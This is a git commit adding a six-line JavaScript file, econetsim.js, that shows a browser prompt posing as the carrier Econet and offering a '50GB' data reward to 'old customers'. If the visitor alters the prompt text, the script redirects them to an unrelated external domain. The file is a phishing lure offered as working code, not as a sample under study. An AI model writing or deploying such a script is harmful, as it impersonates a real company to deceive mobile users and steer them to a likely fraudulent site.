3150f6b71f2bd18262b7fb1c31bf72191fcba560
bigetijazz32 <bigetijazz32@gmail.com>
2025-06-29 13:23:18 +0100

    Create econetsim.js

---
+++ econetsim.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('Econet: Dear customer, please check if your SIM card is eligible to receive old customers data reward. to ACTIVATE 50GB, press Ok to verify now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://www.udwang.xyz/econet50gb';
+}
